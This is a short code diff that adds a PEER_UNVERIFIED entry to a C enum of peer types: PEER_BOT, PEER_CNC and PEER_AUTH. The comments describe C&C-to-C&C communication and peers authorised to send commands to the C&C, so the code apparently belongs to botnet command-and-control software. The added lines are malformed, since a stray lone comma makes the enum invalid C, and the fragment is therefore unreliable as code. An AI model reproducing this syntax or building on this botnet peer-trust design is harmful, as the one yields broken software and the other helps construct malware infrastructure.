@@ -8,6 +8,8 @@
 #include "lrsa.h"
 
 typedef enum {
+        PEER_UNVERIFIED,
+,
     PEER_BOT,
     PEER_CNC, /* cnc 2 cnc communication */
     PEER_AUTH /* authorized peers can send commands to cnc */
